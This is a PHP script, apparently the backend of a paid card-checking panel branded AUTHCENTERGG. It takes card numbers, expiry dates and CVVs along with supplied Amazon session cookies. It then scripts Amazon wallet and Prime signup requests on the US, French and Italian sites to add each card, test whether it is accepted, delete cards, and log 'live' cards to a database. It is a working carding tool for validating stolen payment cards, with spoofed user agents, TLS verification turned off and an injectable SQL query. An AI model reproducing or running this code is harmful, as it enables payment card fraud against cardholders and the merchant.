<?php
session_start();
set_time_limit(0);
include_once("../../conn.php");
date_default_timezone_set('America/Sao_Paulo');


// Verifica se o usuário está logado
if (!isset($_SESSION['usuario'])) {
    die(json_encode(array("error" => "Acesso negado - Usuário não logado")));
}

// Verifica se o usuário tem validade ativa
$usuario = $_SESSION['usuario'];
$query = mysqli_query($conn, "SELECT validade FROM usuarios WHERE usuario = '$usuario'");
$dados = mysqli_fetch_assoc($query);

if (!$dados || strtotime($dados['validade']) < time()) {
    die(json_encode(array("error" => "Acesso negado - Usuário com acesso expirado")));
}

error_reporting(0);

  unlink("amazon.txt");
  unlink("cookie.txt");
  unlink("cookies.txt");
 
function multiexplode($delimiters, $string){
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;}
    
    
function getStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
  }

function getRequest($url){
    global $ch;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($ch, CURLOPT_POST, false);
    return curl_exec($ch);
}
function setHeaders($array){
    global $ch;
    curl_setopt($ch, CURLOPT_HTTPHEADER, $array); 
}
function postRequest($url, $post){
    global $ch;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    return curl_exec($ch);
}

function generateRandomString($length = 12) {
$characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];
}
return $randomString;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

if(strlen($ano) == 2){
  $ano = substr($ano, -2);}
else{
  $ano = substr($ano, 2);
}
        
if(strlen($mes) == 1){
  $mes = "0".$mes;
}

$rand = rand(100,999);
$time = time();

function gerarLetrasAleatorias($quantidade) {
$letras = 'abcdefghijABCDEFGHIJ'; // Letras disponíveis
$tamanhoLetras = strlen($letras);
$resultado = '';

for ($i = 0; $i < $quantidade; $i++) {
$indice = rand(0, $tamanhoLetras - 1);
$resultado .= $letras[$indice];
}

return $resultado;
}

$quantidadeLetras = 15; 
$letrasAleatorias = gerarLetrasAleatorias($quantidadeLetras);
$binblock = substr($lista, 0,6);

function convertCookie($text, $outputFormat = 'US')
{
    $countryCodes = [
        'ES' => ['code' => 'acbes', 'currency' => 'EUR', 'lc' => 'lc-acbes', 'lc_value' => 'es_ES'],
        'MX' => ['code' => 'acbmx', 'currency' => 'MXN', 'lc' => 'lc-acbmx', 'lc_value' => 'es_MX'],
        'IT' => ['code' => 'acbit', 'currency' => 'EUR', 'lc' => 'lc-acbit', 'lc_value' => 'it_IT'],
        'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
        'DE' => ['code' => 'acbde', 'currency' => 'EUR', 'lc' => 'lc-main', 'lc_value' => 'de_DE'],
        'BR' => ['code' => 'acbbr', 'currency' => 'BRL', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
        'AE' => ['code' => 'acbae', 'currency' => 'AED', 'lc' => 'lc-acbae', 'lc_value' => 'en_AE'],
        'SG' => ['code' => 'acbsg', 'currency' => 'SGD', 'lc' => 'lc-acbsg', 'lc_value' => 'en_SG'],
        'SA' => ['code' => 'acbsa', 'currency' => 'SAR', 'lc' => 'lc-acbsa', 'lc_value' => 'ar_AE'],
        'CA' => ['code' => 'acbca', 'currency' => 'CAD', 'lc' => 'lc-acbca', 'lc_value' => 'ar_CA'],
        'PL' => ['code' => 'acbpl', 'currency' => 'PLN', 'lc' => 'lc-acbpl', 'lc_value' => 'pl_PL'],
        'FR' => ['code' => 'acbfr', 'currency' => 'EUR', 'lc' => 'lc-acbfr', 'lc_value' => 'fr_FR'],
        'SE' => ['code' => 'acbse', 'currency' => 'SEK', 'lc' => 'lc-acbse', 'lc_value' => 'se_SE'],
        'TR' => ['code' => 'acbtr', 'currency' => 'TRY', 'lc' => 'lc-acbtr', 'lc_value' => 'tr_TR'],
        'UK' => ['code' => 'acbuk', 'currency' => 'GBP', 'lc' => 'lc-acbuk', 'lc_value' => 'en_GB'],
        'NL' => ['code' => 'acbnl', 'currency' => 'EUR', 'lc' => 'lc-acbnl', 'lc_value' => 'nl_NL'],
        'AU' => ['code' => 'acbau', 'currency' => 'AUD', 'lc' => 'lc-acbau', 'lc_value' => 'en_AU'],
        'BEL' => ['code' => 'acbbe', 'currency' => 'EUR', 'lc' => 'lc-acbbe', 'lc_value' => 'fr_BE'],
        'JP' => ['code' => 'acbjp', 'currency' => 'JPY', 'lc' => 'lc-acbjp', 'lc_value' => 'ja_JP'],

    ];

    if (!array_key_exists($outputFormat, $countryCodes)) {
        return $text;
    }

    $currentCountry = $countryCodes[$outputFormat];

    $text = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg', 'acbus', 'acbde'], $currentCountry['code'], $text);
    $text = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $currentCountry['currency'], $text);
    $text = preg_replace('/(' . $currentCountry['lc'] . '=)[a-z]{2}_[A-Z]{2}/', '$1' . $currentCountry['lc_value'], $text);
    $text = str_replace('acbuc', $currentCountry['code'], $text);

    return $text;
}


$cookieUS = $_GET['key'];

$cookie1 = convertCookie($cookieUS, 'US');
$cookie3 = convertCookie($cookieUS, 'US');
$cookie4 = convertCookie($cookieUS, 'IT');
$cookie6 = convertCookie($cookieUS, 'IT');

$email = ($letrasAleatorias);


$cookie2 = convertCookie($cookieUS, 'FR');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.fr/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.amazon.fr';
$headers[] = 'Cookie: '.$cookie2.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$r = curl_exec($ch);
    
$wigstst = getStr($r, '"serializedState":"','"');
$customerId = getStr($r, 'customerId":"','"');
$payment = getStr($r, 'includeAPX3Register":"none","selectedInstrumentId":"','"');
$cardid_puro3 = getStr($r, '":{"instrumentId":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.fr/payments-portal/data/widgets2/v1/customer/'.$customerId.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-jsEnabled=true&ppw-widgetState=".$wigstst."&ppw-widgetEvent=StartEditEvent&ppw-iid=".$payment."&ppw-paymentMethodType=Card&ppw-isDefaultPaymentMethod=false");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.amazon.fr';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://www.amazon.fr';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$r = curl_exec($ch);

$wigstst222 = getStr($r, 'name=\"ppw-widgetState\" value=\"','\"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.fr/payments-portal/data/widgets2/v1/customer/'.$customerId.'/continueWidget?sif_profile=APX-Encrypt-All-EU');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22".$cardid_puro3."%22%2C%22paymentMethodCode%22%3A%22CC%22%7D=Supprimer+du+portefeuille&ppw-jsEnabled=true&ppw-widgetState=".$wigstst222."&ie=UTF-8&ppw-accountHolderName=nCyTkYcqog+qDwxYtlKIm&ppw-expirationDate_month=4&ppw-expirationDate_year=2027");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.amazon.fr';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://www.amazon.fr';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$r = curl_exec($ch);

$wigst1st = getStr($r, 'name=\"ppw-widgetState\" value=\"','\"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.fr/payments-portal/data/widgets2/v1/customer/'.$customerId.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-jsEnabled=true&ppw-widgetState=".$wigst1st."&ie=UTF-8&ppw-widgetEvent=DeleteInstrumentEvent");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.amazon.fr';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://www.amazon.fr';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
   

$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, false); 
curl_setopt($ch, CURLOPT_TIMEOUT, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch,CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);


setHeaders(array(
  'Cookie: '.$cookie1.'',
  'Host: www.amazon.com',
  "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
));

  $add = getRequest('https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca');
  $csrf = getstr($add, 'csrfToken = "','"');

#req1


setHeaders(array(
  'Cookie: '.$cookie1.'',
  'Content-Type: application/x-www-form-urlencoded',
  'Host: www.amazon.com',
  "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
));

$post = 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22'.generateRandomString(10).'+'.generateRandomString(10).'%22%2C%22cc_ExpirationMonth%22%3A%22'.intval($mes).'%22%2C%22cc_ExpirationYear%22%3A%22'.$ano.'%22%7D%7D%7D&csrfToken='.urlencode($csrf).'&addCreditCardNumber='.$cc.'';

  $add = postRequest('https://www.amazon.com/hz/mycd/ajax', $post);
  $cardid_puro = getstr($add, '"paymentInstrumentId":"','"');
#req2

setHeaders(array(
  'Cookie: '.$cookie1.'',
  'Host: www.amazon.com',
  'Content-Type: application/x-www-form-urlencoded',
  "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
));


$post = 'data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken='.urlencode($csrf).'';

  $add = postRequest('https://www.amazon.com/hz/mycd/ajax', $post);
  $addresid = getStr($add, 'AddressId":"','"');

#req3
setHeaders(array(
  'Cookie: '.$cookie1.'',
  'Host: www.amazon.com',
  "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',

));

$post = 'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22'.$cardid_puro.'%22%2C%22billingAddressId%22%3A%22'.$addresid.'%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken='.urlencode($csrf).'';

  $add = postRequest('https://www.amazon.com/hz/mycd/ajax', $post);


setHeaders(array(
  "Host: www.amazon.com",
  "content-type: application/x-www-form-urlencoded",
  'Cookie: '.$cookie3.'',
));


$post = 'clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1';

  $add = postRequest('https://www.amazon.com/gp/prime/pipeline/membersignup', $post);


  $wid9090 = getstr($add, 'hidden" name="ppw-widgetState" value="','"');
  $sessionds = getstr($add, 'Subs:Prime","session":"','"');
  $customerID = getstr($add, 'customerId":"','"');
  $noovotoken = getstr($add, 'instrumentIds&quot;:[&quot;','&');
  $redirecturl = getstr($add, 'input type="hidden" name="redirectURL" value="','"/');
  $ohtoken1 = getstr($add, 'selectedInstrumentIds":["','"');
  $ohtoken2 = getstr($add, 'clientId":"Subs:Prime","serializedState":"','"');

#req5


setHeaders(array(
  'Host: www.amazon.com',
  'Cookie: '.$cookie3.'',
  'Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"',
  'Sec-Ch-Device-Memory: 8',
  'Sec-Ch-Viewport-Width: 1360',
  'Sec-Ch-Ua-Platform-Version: \"10.0.0\"',
  'X-Requested-With: XMLHttpRequest',
  'Dpr: 1',
  'Downlink: 10',
  'Apx-Widget-Info: Subs:Prime/desktop/LFqEJMZmYdCd',
  'Sec-Ch-Ua-Platform: \"Windows\"',
  'Device-Memory: 8',
  'Widget-Ajax-Attempt-Count: 0',
  'Rtt: 150',
  'Sec-Ch-Ua-Mobile: ?0',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Viewport-Width: 1360',
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
  'Accept: application/json, text/javascript, */*; q=0.01',
  'Sec-Ch-Dpr: 1',
  'Ect: 4g',
  'Origin: https://www.amazon.com',
  'Sec-Fetch-Site: same-origin',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Dest: empty',
  'Referer: https://www.amazon.com/gp/prime/pipeline/confirm',
  'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
));


$post = "ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22".$cardid_puro."%22%5D%2C%22instrumentIds%22%3A%5B%22".$cardid_puro."%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken2."&ie=UTF-8";

  $result = postRequest('https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget', $post);
  $ohtoken3 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');
  $ohtoken4 = getstr($result, 'data-instrument-id=\"','\"');

          #req6      

setHeaders(array(
  'Host: www.amazon.com',
  'Cookie: '.$cookie3.'',
  'Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"',
  'Sec-Ch-Device-Memory: 8',
  'Sec-Ch-Viewport-Width: 1360',
  'Sec-Ch-Ua-Platform-Version: \"10.0.0\"',
  'X-Requested-With: XMLHttpRequest',
  'Dpr: 1',
  'Downlink: 10',
  'Apx-Widget-Info: Subs:Prime/desktop/LFqEJMZmYdCd',
  'Sec-Ch-Ua-Platform: \"Windows\"',
  'Device-Memory: 8',
  'Widget-Ajax-Attempt-Count: 0',
  'Rtt: 150',
  'Sec-Ch-Ua-Mobile: ?0',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Viewport-Width: 1360',
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
  'Accept: application/json, text/javascript, */*; q=0.01',
  'Sec-Ch-Dpr: 1',
  'Ect: 4g',
  'Origin: https://www.amazon.com',
  'Sec-Fetch-Site: same-origin',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Dest: empty',
  'Referer: https://www.amazon.com/gp/prime/pipeline/confirm',
  'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
));


$post = "ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken3."&ie=UTF-8&ppw-".$token4."_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D".$cardid_puro."%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-".$cardid_puro."_instrumentOrderTotalBalance=%7B%7D";

  $result = postRequest('https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget', $post);
  $walletid2 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');


#req7
setHeaders(array(
  'Host: www.amazon.com',
  'Cookie: '.$cookie3.'',
  'Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"',
  'Sec-Ch-Device-Memory: 8',
  'Sec-Ch-Viewport-Width: 1360',
  'Sec-Ch-Ua-Platform-Version: \"10.0.0\"',
  'X-Requested-With: XMLHttpRequest',
  'Dpr: 1',
  'Downlink: 10',
  'Apx-Widget-Info: Subs:Prime/desktop/LFqEJMZmYdCd',
  'Sec-Ch-Ua-Platform: \"Windows\"',
  'Device-Memory: 8',
  'Widget-Ajax-Attempt-Count: 0',
  'Rtt: 150',
  'Sec-Ch-Ua-Mobile: ?0',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Viewport-Width: 1360',
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
  'Accept: application/json, text/javascript, */*; q=0.01',
  'Sec-Ch-Dpr: 1',
  'Ect: 4g',
  'Origin: https://www.amazon.com',
  'Sec-Fetch-Site: same-origin',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Dest: empty',
  'Referer: https://www.amazon.com/gp/prime/pipeline/confirm',
  'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
));

$post = "ppw-jsEnabled=true&ppw-widgetState=".$walletid2."&ppw-widgetEvent=SavePaymentPreferenceEvent";

  $result = postRequest('https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget', $post);
  $walletid = getstr($result, 'preferencePaymentMethodIds":"[\"','\"');

#req7
setHeaders(array(
'Host: www.amazon.com',
'Cookie: '.$cookie3.'',

));

$Fim = getRequest('https://www.amazon.com/hp/wlp/pipeline/actions?redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm&locationID=prime_confirm&primeCampaignId=SlashPrime&paymentMethodId='.$walletid.'&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&cancelRedirectURL=Lw&paymentMethodIdList='.$walletid.'&location=prime_confirm&session-id='.$sessionds.'');

setHeaders(array(
  'Cookie: '.$cookie4.'',
  'Content-Type: application/x-www-form-urlencoded',
  'Host: www.amazon.it',
  "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1"
));

$result = getRequest('https://www.amazon.it/cpe/yourpayments/wallet');
$serial1 = getstr($result, '"4-','"');
$paymentidons = getstr($result, '"paymentMethodId":"','"');
$costomerid = getstr($result, '"customerId":"','"');


$quotquot = getstr($result, 'instrumentId":"','"');
$widgetInstanceId = getstr($result, 'widgetInstanceId":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.it/payments-portal/data/widgets2/v1/customer/'.$costomerid.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22".$quotquot."%22%2C%22renderPopover%22%3A%22true%22%7D=&ppw-jsEnabled=true&ppw-widgetState=4-".$serial1."&ie=UTF-8");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.amazon.it';
$headers[] = 'Cookie: '.$cookie4.'';
$headers[] = 'Device-Memory: 8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Downlink: 10';
$headers[] = 'Widget-Ajax-Attempt-Count: 0';
"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1";
$headers[] = 'Rtt: 200';
$headers[] = 'Origin: https://www.amazon.it';
$headers[] = 'Referer: https://www.amazon.it/cpe/yourpayments/wallet';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

$diferentenonce = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.it/payments-portal/data/widgets2/v1/customer/'.$costomerid.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/amazon.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3ADeleteInstrumentEvent=&ppw-jsEnabled=true&ppw-widgetState=".$diferentenonce."&ie=UTF-8");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.amazon.it';
$headers[] = 'Cookie: '.$cookie4.'';
$headers[] = 'Device-Memory: 8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Downlink: 10';
$headers[] = 'Widget-Ajax-Attempt-Count: 0';
"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1";
$headers[] = 'Rtt: 200';
$headers[] = 'Origin: https://www.amazon.it';
$headers[] = 'Referer: https://www.amazon.it/cpe/yourpayments/wallet';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$r = curl_exec($ch);

$message = 'CARTÃO VINCULADO';
    
if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. If you would still like to join Prime you can sign')) {
echo ("<span class='badge badge-success'> ✔️ </span>
<span class='badge badge-dark'> $lista </span>
<span class='badge badge-success'> CARTÃO VINCULADO </span>
<span class='badge badge-dark'>BY: AUTHCENTERGG</span>");

$cartao = "$cc|$mes|$ano|$cvv";
$checker = "AMAZON";
$query = "INSERT INTO historico_lives (usuario_id, cartao, retorno, checker) VALUES (?, ?, ?, ?)";
$stmt = $conn->prepare($query);
$stmt->bind_param("isss", $_SESSION['usuario_id'], $cartao, $message, $checker);
$stmt->execute();

}

elseif (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {
  echo ("<span class='badge badge-success'> ✔️ </span>
  <span class='badge badge-dark'> $lista </span>
  <span class='badge badge-success'> CARTÃO VINCULADO </span>
  <span class='badge badge-dark'>BY: AUTHCENTERGG</span>");

  $cartao = "$cc|$mes|$ano|$cvv";
  $checker = "AMAZON";
  $query = "INSERT INTO historico_lives (usuario_id, cartao, retorno, checker) VALUES (?, ?, ?, ?)";
  $stmt = $conn->prepare($query);
  $stmt->bind_param("isss", $_SESSION['usuario_id'], $cartao, $message, $checker);
  $stmt->execute();
  
}

#RETORNO US
elseif (strpos($Fim, 'Se você ainda quiser participar do Prime, é possível se inscrever durante a finalização da compra')) {
  echo ("<span class='badge badge-success'> ✔️ </span>
  <span class='badge badge-dark'> $lista </span>
  <span class='badge badge-success'> CARTÃO VINCULADO </span>
  <span class='badge badge-dark'>BY: AUTHCENTERGG</span>");
  
  $cartao = "$cc|$mes|$ano|$cvv";
  $checker = "AMAZON";
  $query = "INSERT INTO historico_lives (usuario_id, cartao, retorno, checker) VALUES (?, ?, ?, ?)";
  $stmt = $conn->prepare($query);
  $stmt->bind_param("isss", $_SESSION['usuario_id'], $cartao, $message, $checker);
  $stmt->execute();
  
}
#RETORNO ITALIA
elseif (strpos($Fim, 'InvalidInput')) {
echo ("<span class='badge badge-danger'> ⚠️ </span>
<span class='badge badge-dark'> $lista  </span>
<span class='badge badge-danger'> CONTA AMAZON SEM ENDEREÇO/CARTÃO INVALIDO! </span>
<span class='badge badge-dark'>BY: AUTHCENTERGG</span>");

}
elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {
echo ("<span class='badge badge-danger'> ❌ </span>
<span class='badge badge-dark'> $lista  </span>
<span class='badge badge-danger'> CARD DECLINED </span>
<span class='badge badge-dark'>BY: AUTHCENTERGG</span>");

} else {
echo ("<span class='badge badge-danger'> ⚠️ </span>
<span class='badge badge-dark'> $lista  </span>
<span class='badge badge-danger'> CONTA DESLOGADA/ATUALIZE OS COOKIES! </span>
<span class='badge badge-dark'>BY: AUTHCENTERGG</span>");

}


